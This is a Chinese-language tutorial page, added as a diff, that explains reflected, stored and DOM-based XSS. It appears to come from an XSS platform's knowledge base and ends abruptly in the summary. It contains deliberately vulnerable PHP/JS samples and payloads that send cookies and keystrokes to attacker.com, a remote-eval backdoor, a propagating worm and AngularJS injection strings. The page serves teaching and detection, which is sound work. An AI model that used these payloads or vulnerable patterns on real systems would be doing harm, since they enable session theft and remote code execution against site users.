@@ -1,0 +1,1027 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+    <meta name="description" content="XSS三大类型深度讲解：反射型XSS、存储型XSS、DOM型XSS的原理、特征及攻击方法。包含大量实战Payload代码示例。">
+    <meta name="keywords" content="XSS类型,反射型XSS,存储型XSS,DOM XSS,Reflected XSS,Stored XSS,XSS攻击,Payload,Web漏洞">
+    <meta name="author" content="蓝莲花XSS平台">
+    <meta property="og:title" content="XSS三大类型详解 - XSS安全知识库">
+    <meta property="og:description" content="全面分析反射型、存储型和DOM型XSS的攻击原理与实战技巧">
+    <meta property="og:type" content="article">
+    <title>XSS三大类型详解 - XSS安全知识库</title>
+    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
+    
+    <style>
+        .article-header {
+            background: linear-gradient(135deg, rgba(0, 0, 0, 0.9) 0%, rgba(0, 20, 10, 0.95) 100%);
+            padding: 80px 0 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .article-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 65, 0.03) 0px,
+                transparent 2px,
+                transparent 4px
+            );
+            pointer-events: none;
+        }
+        
+        .breadcrumb {
+            background: transparent;
+            padding: 0;
+            margin-bottom: 1rem;
+        }
+        
+        .breadcrumb-item a {
+            color: var(--neon-green);
+            text-decoration: none;
+        }
+        
+        .breadcrumb-item.active {
+            color: var(--text-secondary);
+        }
+        
+        .article-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, #00ff41, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+        
+        .article-meta {
+            color: var(--text-tertiary);
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+        
+        .article-content {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 3rem;
+            margin: 2rem 0;
+        }
+        
+        .article-content h2 {
+            color: var(--neon-green);
+            font-size: 1.8rem;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid var(--border-color);
+        }
+        
+        .article-content h3 {
+            color: var(--text-highlight);
+            font-size: 1.4rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .article-content h4 {
+            color: var(--cyan);
+            font-size: 1.2rem;
+            margin-top: 1.5rem;
+            margin-bottom: 0.8rem;
+        }
+        
+        .article-content p {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: 1rem;
+        }
+        
+        .article-content ul, .article-content ol {
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: 1rem;
+            padding-left: 2rem;
+        }
+        
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin: 1rem 0;
+            overflow-x: auto;
+        }
+        
+        .code-block pre {
+            margin: 0;
+            color: var(--text-primary);
+        }
+        
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box h4 {
+            color: #ffc107;
+            margin-top: 0;
+        }
+        
+        .info-box {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid var(--neon-green);
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .info-box h4 {
+            color: var(--neon-green);
+            margin-top: 0;
+        }
+        
+        .danger-box {
+            background: rgba(220, 53, 69, 0.1);
+            border-left: 4px solid #dc3545;
+            padding: 1rem 1.5rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .danger-box h4 {
+            color: #dc3545;
+            margin-top: 0;
+        }
+        
+        .toc {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        
+        .toc h3 {
+            color: var(--neon-green);
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .toc ul ul {
+            padding-left: 1.5rem;
+        }
+        
+        .toc a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .toc a:hover {
+            color: var(--neon-green);
+        }
+        
+        .article-nav {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .article-nav a {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            padding: 1rem 1.5rem;
+            border-radius: var(--border-radius);
+            color: var(--neon-green);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .article-nav a:hover {
+            background: rgba(0, 255, 65, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .comparison-table {
+            width: 100%;
+            margin: 2rem 0;
+            border-collapse: collapse;
+        }
+        
+        .comparison-table th {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--neon-green);
+            padding: 1rem;
+            border: 1px solid var(--border-color);
+        }
+        
+        .comparison-table td {
+            color: var(--text-secondary);
+            padding: 1rem;
+            border: 1px solid var(--border-color);
+        }
+        
+        .flow-diagram {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            border-radius: var(--border-radius);
+            padding: 2rem;
+            margin: 2rem 0;
+            text-align: center;
+        }
+        
+        .flow-step {
+            display: inline-block;
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--neon-green);
+            padding: 1rem 1.5rem;
+            margin: 0.5rem;
+            border-radius: var(--border-radius);
+            color: var(--text-primary);
+        }
+        
+        .flow-arrow {
+            display: inline-block;
+            color: var(--cyan);
+            font-size: 1.5rem;
+            margin: 0 1rem;
+        }
+        
+        @media (max-width: 768px) {
+            .article-title {
+                font-size: 1.8rem;
+            }
+            
+            .article-content {
+                padding: 1.5rem;
+            }
+            
+            .flow-step {
+                display: block;
+                margin: 1rem 0;
+            }
+            
+            .flow-arrow {
+                display: block;
+                transform: rotate(90deg);
+            }
+        }
+        
+        /* 回到顶部按钮 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <!-- Article Header -->
+    <div class="article-header">
+        <div class="container">
+            <nav aria-label="breadcrumb">
+                <ol class="breadcrumb">
+                    <li class="breadcrumb-item"><a href="../wiki.html"><i class="fas fa-book"></i> 知识库</a></li>
+                    <li class="breadcrumb-item active">XSS三大类型详解</li>
+                </ol>
+            </nav>
+            <h1 class="article-title">XSS三大类型详解：反射型、存储型与DOM型</h1>
+            <div class="article-meta">
+                <span><i class="far fa-calendar"></i> 2025年12月</span>
+                <span class="mx-3">|</span>
+                <span><i class="far fa-clock"></i> 20分钟阅读</span>
+                <span class="mx-3">|</span>
+                <span><i class="fas fa-tag"></i> 基础知识</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-10 offset-lg-1">
+                    <!-- Table of Contents -->
+                    <div class="toc">
+                        <h3><i class="fas fa-list"></i> 目录</h3>
+                        <ul>
+                            <li><a href="#overview">1. XSS分类概述</a></li>
+                            <li><a href="#reflected-xss">2. 反射型XSS（Reflected XSS）</a></li>
+                            <li><a href="#stored-xss">3. 存储型XSS（Stored XSS）</a></li>
+                            <li><a href="#dom-xss">4. DOM型XSS（DOM-based XSS）</a></li>
+                            <li><a href="#comparison">5. 三种类型对比</a></li>
+                            <li><a href="#detection">6. 如何检测不同类型的XSS</a></li>
+                            <li><a href="#summary">7. 总结</a></li>
+                        </ul>
+                    </div>
+                    
+                    <!-- Article Content -->
+                    <div class="article-content">
+                        <h2 id="overview">1. XSS分类概述</h2>
+                        <p>
+                            根据XSS漏洞的产生原理和攻击方式，XSS可以分为三大类型：<strong>反射型XSS</strong>、<strong>存储型XSS</strong>和<strong>DOM型XSS</strong>。这三种类型虽然都是XSS攻击，但它们的工作机制、危害程度和利用难度都有所不同。
+                        </p>
+                        
+                        <div class="info-box">
+                            <h4><i class="fas fa-lightbulb"></i> 分类依据</h4>
+                            <p>XSS的分类主要基于以下两个维度：</p>
+                            <ul>
+                                <li><strong>数据流向</strong>：恶意代码是如何到达受害者浏览器的</li>
+                                <li><strong>存储位置</strong>：恶意代码是否被持久化存储</li>
+                            </ul>
+                        </div>
+                        
+                        <p>快速区分三种类型：</p>
+                        <ul>
+                            <li><strong>反射型</strong>：恶意代码在URL中，点击链接立即触发，不存储</li>
+                            <li><strong>存储型</strong>：恶意代码存储在服务器（数据库），每次访问都触发</li>
+                            <li><strong>DOM型</strong>：恶意代码在客户端处理，不经过服务器</li>
+                        </ul>
+                        
+                        <h2 id="reflected-xss">2. 反射型XSS（Reflected XSS）</h2>
+                        
+                        <h3>2.1 工作原理</h3>
+                        <p>
+                            反射型XSS，也称为<strong>非持久型XSS</strong>，是最常见的XSS类型。攻击代码通过URL参数、表单提交等方式发送到服务器，服务器将这些数据"反射"回浏览器并渲染，从而导致恶意脚本执行。
+                        </p>
+                        
+                        <div class="flow-diagram">
+                            <div class="flow-step">1. 攻击者构造恶意URL</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">2. 受害者点击链接</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">3. 服务器处理请求</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">4. 将恶意代码反射到响应中</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">5. 浏览器执行恶意脚本</div>
+                        </div>
+                        
+                        <h3>2.2 典型场景</h3>
+                        <p>反射型XSS最常见于以下功能：</p>
+                        <ul>
+                            <li>搜索功能（搜索关键词回显）</li>
+                            <li>错误提示页面（显示错误参数）</li>
+                            <li>跳转页面（显示来源URL）</li>
+                            <li>表单验证失败提示（回显用户输入）</li>
+                        </ul>
+                        
+                        <h3>2.3 代码示例</h3>
+                        
+                        <h4>存在漏洞的搜索功能</h4>
+                        <div class="code-block">
+                            <pre><code class="language-php">&lt;?php
+// 搜索页面 search.php
+$keyword = $_GET['q'];
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;搜索结果&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;搜索: &lt;?php echo $keyword; ?&gt;&lt;/h1&gt;
+    &lt;!-- 如果$keyword包含恶意脚本，这里会直接执行 --&gt;
+    &lt;p&gt;未找到相关结果&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                        </div>
+                        
+                        <h4>攻击示例</h4>
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!-- 正常URL --&gt;
+http://example.com/search.php?q=hello
+
+&lt;!-- 恶意URL --&gt;
+http://example.com/search.php?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;!-- 更隐蔽的攻击 --&gt;
+http://example.com/search.php?q=&lt;img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)"&gt;
+
+&lt;!-- URL编码后的攻击（绕过简单过滤）--&gt;
+http://example.com/search.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</code></pre>
+                        </div>
+                        
+                        <h3>2.4 实战案例：错误页面XSS</h3>
+                        <div class="code-block">
+                            <pre><code class="language-php">&lt;?php
+// error.php - 存在漏洞的错误页面
+$message = $_GET['msg'];
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;错误&lt;/h1&gt;
+    &lt;p style="color: red;"&gt;&lt;?php echo $message; ?&gt;&lt;/p&gt;
+    &lt;a href="javascript:history.back()"&gt;返回&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- 攻击URL --&gt;
+http://example.com/error.php?msg=&lt;script&gt;
+    // 窃取Cookie并重定向
+    var c = document.cookie;
+    window.location='http://attacker.com/steal.php?data='+encodeURIComponent(c);
+&lt;/script&gt;</code></pre>
+                        </div>
+                        
+                        <h3>2.5 反射型XSS的特点</h3>
+                        <ul>
+                            <li>✓ <strong>需要诱导</strong>：必须诱使受害者点击恶意链接</li>
+                            <li>✓ <strong>非持久性</strong>：不会保存到数据库，只影响当前请求</li>
+                            <li>✓ <strong>传播方式</strong>：通过邮件、社交媒体、聊天工具等分享恶意链接</li>
+                            <li>✓ <strong>检测相对容易</strong>：查看URL即可发现异常</li>
+                            <li>✗ <strong>影响范围有限</strong>：只影响点击链接的用户</li>
+                        </ul>
+                        
+                        <div class="warning-box">
+                            <h4><i class="fas fa-exclamation-triangle"></i> 社会工程学配合</h4>
+                            <p>攻击者通常会使用URL缩短服务（如bit.ly）隐藏恶意URL，或者通过钓鱼邮件诱导用户点击。例如：</p>
+                            <p>"您的账户存在异常，请点击以下链接立即验证：http://bit.ly/xxxxx"</p>
+                        </div>
+                        
+                        <h2 id="stored-xss">3. 存储型XSS（Stored XSS）</h2>
+                        
+                        <h3>3.1 工作原理</h3>
+                        <p>
+                            存储型XSS，也称为<strong>持久型XSS</strong>，是危害最大的XSS类型。攻击者将恶意脚本提交到服务器并存储在数据库中，之后每个访问相关页面的用户都会受到攻击。
+                        </p>
+                        
+                        <div class="flow-diagram">
+                            <div class="flow-step">1. 攻击者提交恶意脚本</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">2. 服务器存储到数据库</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">3. 受害者访问页面</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">4. 服务器从数据库读取数据</div>
+                            <div class="flow-arrow">→</div>
+                            <div class="flow-step">5. 浏览器执行恶意脚本</div>
+                        </div>
+                        
+                        <h3>3.2 典型场景</h3>
+                        <ul>
+                            <li>用户评论系统</li>
+                            <li>论坛帖子和回复</li>
+                            <li>用户资料（昵称、签名、个人简介等）</li>
+                            <li>博客文章</li>
+                            <li>留言板</li>
+                            <li>私信系统</li>
+                            <li>商品评价</li>
+                        </ul>
+                        
+                        <h3>3.3 代码示例</h3>
+                        
+                        <h4>存在漏洞的评论系统</h4>
+                        <div class="code-block">
+                            <pre><code class="language-php">&lt;?php
+// 保存评论 - save_comment.php
+if($_POST['comment']) {
+    $comment = $_POST['comment'];
+    $user_id = $_SESSION['user_id'];
+    
+    // 直接存储，未做任何过滤！
+    $stmt = $pdo->prepare("INSERT INTO comments (user_id, content, created_at) VALUES (?, ?, NOW())");
+    $stmt->execute([$user_id, $comment]);
+    
+    header("Location: article.php?id=" . $_POST['article_id']);
+}
+
+// 显示评论 - article.php
+$comments = $pdo->query("SELECT * FROM comments WHERE article_id = " . $_GET['id']);
+?&gt;
+&lt;div class="comments"&gt;
+    &lt;?php foreach($comments as $comment): ?&gt;
+        &lt;div class="comment"&gt;
+            &lt;!-- 直接输出，未做HTML转义！ --&gt;
+            &lt;p&gt;&lt;?php echo $comment['content']; ?&gt;&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;?php endforeach; ?&gt;
+&lt;/div&gt;</code></pre>
+                        </div>
+                        
+                        <h4>攻击Payload</h4>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 攻击者发表以下评论：
+
+// 1. Cookie窃取
+&lt;script&gt;
+fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
+&lt;/script&gt;
+
+// 2. 键盘记录器
+&lt;script&gt;
+document.addEventListener('keypress', function(e) {
+    var img = new Image();
+    img.src = 'http://attacker.com/keylog.php?key=' + e.key;
+});
+&lt;/script&gt;
+
+// 3. 页面重定向
+&lt;script&gt;
+setTimeout(function() {
+    window.location.href = 'http://malicious-site.com';
+}, 5000);
+&lt;/script&gt;
+
+// 4. 隐蔽的后门
+&lt;img src=x style="display:none" onerror="
+    setInterval(function(){
+        fetch('http://attacker.com/cmd.php')
+            .then(r=>r.text())
+            .then(cmd=>eval(cmd));
+    }, 30000);
+"&gt;</code></pre>
+                        </div>
+                        
+                        <h3>3.4 高级攻击：用户资料XSS</h3>
+                        <div class="code-block">
+                            <pre><code class="language-php">&lt;?php
+// profile.php - 用户资料页面
+$user = getUserById($_GET['id']);
+?&gt;
+&lt;div class="profile"&gt;
+    &lt;h2&gt;&lt;?php echo $user['nickname']; ?&gt;&lt;/h2&gt;
+    &lt;p&gt;签名：&lt;?php echo $user['signature']; ?&gt;&lt;/p&gt;
+    &lt;p&gt;个人简介：&lt;?php echo $user['bio']; ?&gt;&lt;/p&gt;
+&lt;/div&gt;
+
+&lt;!-- 攻击者在个人资料中输入： --&gt;
+&lt;!-- 昵称: 正常用户名 --&gt;
+&lt;!-- 签名: &lt;script src="https://attacker.com/xss.js"&gt;&lt;/script&gt; --&gt;
+&lt;!-- 简介: &lt;img src=x onerror="eval(atob('恶意代码的base64编码'))"&gt; --&gt;</code></pre>
+                        </div>
+                        
+                        <h3>3.5 存储型XSS蠕虫</h3>
+                        <p>
+                            存储型XSS最可怕的利用方式是创建自我复制的蠕虫。以下是一个简化的示例：
+                        </p>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// XSS蠕虫示例（简化版）
+&lt;script&gt;
+(function() {
+    // 恶意Payload
+    var payload = '&lt;script src="http://attacker.com/worm.js"&gt;&lt;/scr' + 'ipt&gt;';
+    
+    // 自动发表评论，传播蠕虫
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/api/comment', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.send('content=' + encodeURIComponent(payload));
+    
+    // 窃取Cookie
+    new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
+})();
+&lt;/script&gt;</code></pre>
+                        </div>
+                        
+                        <div class="danger-box">
+                            <h4><i class="fas fa-virus"></i> 2005年MySpace Samy蠕虫</h4>
+                            <p>
+                                这是历史上最著名的XSS蠕虫案例。Samy Kamkar利用MySpace的存储型XSS漏洞，创建了一个自我传播的蠕虫。该蠕虫会：
+                            </p>
+                            <ul>
+                                <li>自动将访问者添加为Samy的好友</li>
+                                <li>在访问者的个人资料中添加"but most of all, Samy is my hero"</li>
+                                <li>将蠕虫代码复制到访问者的资料页</li>
+                            </ul>
+                            <p>短短20小时内，Samy获得了超过100万好友，最终导致MySpace服务器崩溃。</p>
+                        </div>
+                        
+                        <h3>3.6 存储型XSS的特点</h3>
+                        <ul>
+                            <li>✓ <strong>持久性</strong>：存储在服务器，长期有效</li>
+                            <li>✓ <strong>自动触发</strong>：无需用户交互，访问即中招</li>
+                            <li>✓ <strong>影响范围广</strong>：所有访问者都会受到攻击</li>
+                            <li>✓ <strong>危害最大</strong>：可以窃取管理员Cookie、蠕虫传播等</li>
+                            <li>✗ <strong>难以发现</strong>：可能长期潜伏</li>
+                            <li>✗ <strong>清除困难</strong>：需要清理数据库</li>
+                        </ul>
+                        
+                        <h2 id="dom-xss">4. DOM型XSS（DOM-based XSS）</h2>
+                        
+                        <h3>4.1 工作原理</h3>
+                        <p>
+                            DOM型XSS是一种特殊的XSS类型，其特点是<strong>整个攻击过程在客户端完成，不经过服务器</strong>。恶意代码通过修改页面的DOM环境来执行，服务器响应中不包含恶意脚本，因此服务器端的XSS防护无法检测到。
+                        </p>
+                        
+                        <div class="info-box">
+                            <h4><i class="fas fa-info-circle"></i> 什么是DOM？</h4>
+                            <p>
+                                DOM（Document Object Model，文档对象模型）是浏览器对HTML文档的内部表示。JavaScript可以通过DOM API来读取和修改页面内容。
+                            </p>
+                        </div>
+                        
+                        <h3>4.2 常见的DOM XSS源和汇</h3>
+                        
+                        <h4>危险的Source（数据来源）</h4>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// URL相关
+window.location.href
+window.location.search
+window.location.hash
+document.URL
+document.documentURI
+document.baseURI
+
+// 引用来源
+document.referrer
+
+// 其他
+window.name
+localStorage
+sessionStorage</code></pre>
+                        </div>
+                        
+                        <h4>危险的Sink（执行点）</h4>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// HTML修改
+element.innerHTML
+element.outerHTML
+document.write()
+document.writeln()
+
+// JavaScript执行
+eval()
+setTimeout()
+setInterval()
+Function()
+
+// URL跳转
+location.href
+location.assign()
+window.open()
+
+// 脚本加载
+script.src
+script.text
+script.textContent</code></pre>
+                        </div>
+                        
+                        <h3>4.3 代码示例</h3>
+                        
+                        <h4>示例1：innerHTML导致的DOM XSS</h4>
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;div id="welcome"&gt;&lt;/div&gt;
+    
+    &lt;script&gt;
+        // 从URL获取name参数
+        var name = new URLSearchParams(window.location.search).get('name');
+        
+        // 危险！直接将用户输入插入到innerHTML
+        document.getElementById('welcome').innerHTML = 'Welcome, ' + name;
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- 攻击URL --&gt;
+http://example.com/welcome.html?name=&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre>
+                        </div>
+                        
+                        <h4>示例2：eval()导致的DOM XSS</h4>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 获取URL中的lang参数来切换语言
+var lang = new URLSearchParams(window.location.search).get('lang');
+
+// 危险！使用eval执行
+if(lang) {
+    eval('switchLanguage("' + lang + '")');
+}
+
+// 攻击URL
+// http://example.com/?lang=");alert(document.cookie);//</code></pre>
+                        </div>
+                        
+                        <h4>示例3：location.hash导致的DOM XSS</h4>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 根据URL hash显示对应内容
+var section = location.hash.substring(1);
+document.getElementById('content').innerHTML = 
+    '&lt;h2&gt;' + section + '&lt;/h2&gt;';
+
+// 攻击URL
+// http://example.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+                        </div>
+                        
+                        <h4>示例4：jQuery导致的DOM XSS</h4>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 使用jQuery的html()方法
+var input = location.hash.substring(1);
+$('#output').html(input);
+
+// 或者使用选择器
+var id = location.hash.substring(1);
+$(id).show();
+
+// 攻击URL（针对选择器）
+// http://example.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+                        </div>
+                        
+                        <h3>4.4 高级DOM XSS：AngularJS模板注入</h3>
+                        <div class="code-block">
+                            <pre><code class="language-markup">&lt;!-- AngularJS应用 --&gt;
+&lt;div ng-app&gt;
+    &lt;div ng-bind-html="userInput"&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+    // 从URL获取输入
+    var input = location.search.substring(3);
+    angular.element(document.querySelector('[ng-bind-html]'))
+           .scope().$apply(function($scope) {
+               $scope.userInput = input;
+           });
+&lt;/script&gt;
+
+&lt;!-- 攻击Payload --&gt;
+?q={{constructor.constructor('alert(1)')()}}
+?q={{$on.constructor('alert(1)')()}}
+?q={{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}</code></pre>
+                        </div>
+                        
+                        <h3>4.5 DOM型XSS的特点</h3>
+                        <ul>
+                            <li>✓ <strong>完全在客户端</strong>：不经过服务器，服务器日志中不会出现</li>
+                            <li>✓ <strong>绕过服务器防护</strong>：WAF、输入过滤等服务器端防护无效</li>
+                            <li>✓ <strong>难以检测</strong>：需要分析JavaScript代码</li>
+                            <li>✓ <strong>现代框架常见</strong>：SPA应用中更容易出现</li>
+                            <li>✗ <strong>需要代码审计</strong>：自动化扫描器难以发现</li>
+                        </ul>
+                        
+                        <div class="warning-box">
+                            <h4><i class="fas fa-shield-alt"></i> 防护建议</h4>
+                            <p>DOM型XSS的防护重点在客户端：</p>
+                            <ul>
+                                <li>避免使用innerHTML、document.write等危险方法</li>
+                                <li>使用textContent代替innerHTML（如果只需要文本）</li>
+                                <li>对用户输入进行严格的白名单验证</li>
+                                <li>使用框架提供的安全方法（如React的JSX自动转义）</li>
+                                <li>使用CSP（Content Security Policy）限制脚本执行</li>
+                            </ul>
+                        </div>
+                        
+                        <h2 id="comparison">5. 三种类型对比</h2>
+                        
+                        <table class="comparison-table">
+                            <thead>
+                                <tr>
+                                    <th>特性</th>
+                                    <th>反射型XSS</th>
+                                    <th>存储型XSS</th>
+                                    <th>DOM型XSS</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>数据存储</strong></td>
+                                    <td>不存储</td>
+                                    <td>存储在服务器</td>
+                                    <td>不存储</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>触发方式</strong></td>
+                                    <td>点击恶意链接</td>
+                                    <td>访问包含恶意数据的页面</td>
+                                    <td>访问特定URL</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>影响范围</strong></td>
+                                    <td>点击链接的用户</td>
+                                    <td>所有访问者</td>
+                                    <td>点击链接的用户</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>持久性</strong></td>
+                                    <td>非持久</td>
+                                    <td>持久</td>
+                                    <td>非持久</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>服务器参与</strong></td>
+                                    <td>是</td>
+                                    <td>是</td>
+                                    <td>否</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>检测难度</strong></td>
+                                    <td>容易</td>
+                                    <td>中等</td>
+                                    <td>困难</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>危害程度</strong></td>
+                                    <td>中等</td>
+                                    <td>高</td>
+                                    <td>中等</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>利用难度</strong></td>
+                                    <td>需要社会工程学</td>
+                                    <td>相对容易</td>
+                                    <td>需要JavaScript知识</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>典型场景</strong></td>
+                                    <td>搜索框、错误页面</td>
+                                    <td>评论、论坛、资料</td>
+                                    <td>单页应用、客户端路由</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>服务器日志</strong></td>
+                                    <td>有记录</td>
+                                    <td>有记录</td>
+                                    <td>可能无记录</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        
+                        <h2 id="detection">6. 如何检测不同类型的XSS</h2>
+                        
+                        <h3>6.1 反射型XSS检测</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 基础测试Payload
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+
+// 检测步骤：
+// 1. 找到所有接受用户输入的参数
+// 2. 依次插入测试Payload
+// 3. 观察响应中是否包含未转义的Payload
+// 4. 检查浏览器是否执行了脚本</code></pre>
+                        </div>
+                        
+                        <h3>6.2 存储型XSS检测</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// 带标识的Payload，便于追踪
+&lt;script&gt;alert('XSS-20250123-001')&lt;/script&gt;
+&lt;img src=x onerror="console.log('XSS-STORED-001')"&gt;
+
+// 检测步骤：
+// 1. 在表单、评论等处提交测试Payload
+// 2. 访问可能显示该数据的所有页面
+// 3. 检查是否触发脚本执行
+// 4. 检查不同用户权限下的访问情况（普通用户、管理员）</code></pre>
+                        </div>
+                        
+                        <h3>6.3 DOM型XSS检测</h3>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">// DOM XSS测试Payload
+#&lt;img src=x onerror=alert('DOM-XSS')&gt;
+?param=&lt;img src=x onerror=alert(1)&gt;
+
+// 检测步骤：
+// 1. 审查JavaScript代码，查找危险的Source和Sink
+// 2. 通过URL参数、Hash等注入测试Payload
+// 3. 使用浏览器开发者工具监控DOM变化
+// 4. 使用DOM XSS专用扫描器（如DOMinator）</code></pre>
+                        </div>
+                        
+                        <h3>6.4 自动化扫描工具</h3>
+                        <ul>
+                            <li><strong>Burp Suite</strong>：专业的Web安全测试工具，包含XSS检测模块</li>
+                            <li><strong>OWASP ZAP</strong>：开源的Web应用安全扫描器</li>
+                            <li><strong>XSStrike</strong>：专门用于XSS检测的Python工具</li>
+                            <li><strong>DOMinator</strong>：专注于DOM型XSS的检测工具</li>
+                        </ul>
+                        
+                        <h2 id="summary">7. 总结</h2>
+                        
+                        <p>
+                            本文详细介绍了XSS的三大类型：反射型、存储型和DOM型。每种类型都有其独特的特点和利用方式：
+                        </p>
+                        
+                        <ul>
